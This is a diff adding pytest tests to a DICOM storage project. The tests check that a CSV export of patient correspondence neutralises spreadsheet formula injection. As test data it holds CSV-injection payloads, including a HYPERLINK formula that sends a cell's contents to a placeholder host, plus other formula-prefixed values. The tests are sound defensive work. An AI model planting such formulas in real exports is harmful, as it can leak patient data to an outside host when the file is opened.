@@ -1108,3 +1108,43 @@ class TestProtocolDraftInputs:
         write_minimal_dicom(d / "0001" / "a.dcm", SOPClassUID=CTImageStorage, KVP="120")
         _exam, headers = sm.protocol_draft_inputs_sync(1)
         assert headers == {"KVP": "120"}
+
+
+class TestCorrespondenceCsvInjection:
+    """PatientID / UIDs come from DICOM sent by any C-STORE peer (the SCP is
+    unauthenticated); a value starting with = + - @ must not become a live
+    formula when an admin opens the CSV export in a spreadsheet."""
+
+    @pytest.mark.parametrize("evil", [
+        '=HYPERLINK("http://x/?"&A2,"x")', "+1+1", "-2+3", "@SUM(A1)",
+        "\t=1", "\r=1",
+    ])
+    def test_formula_like_values_are_neutralised(self, tmp_path, evil):
+        import csv as _csv
+        import io as _io
+        from pixieveil.storage import correspondence
+
+        sm = _manager(tmp_path)
+        sc = register_study(sm, 1, "ready")
+        sc.original_patient_id = evil
+        sc.save(sm.base_path)
+
+        text = correspondence.to_csv(correspondence.all_rows(sm.base_path))
+        (row,) = list(_csv.DictReader(_io.StringIO(text)))
+        cell = row["original_patient_id"]
+        assert cell[0] not in "=+-@\t\r"
+        assert cell == "'" + evil            # still readable, just inert
+
+    def test_ordinary_values_unchanged(self, tmp_path):
+        import csv as _csv
+        import io as _io
+        from pixieveil.storage import correspondence
+
+        sm = _manager(tmp_path)
+        sc = register_study(sm, 1, "ready")
+        sc.original_patient_id = "PID-123"
+        sc.save(sm.base_path)
+        text = correspondence.to_csv(correspondence.all_rows(sm.base_path))
+        (row,) = list(_csv.DictReader(_io.StringIO(text)))
+        assert row["original_patient_id"] == "PID-123"
+        assert row["study_number"] == "1"
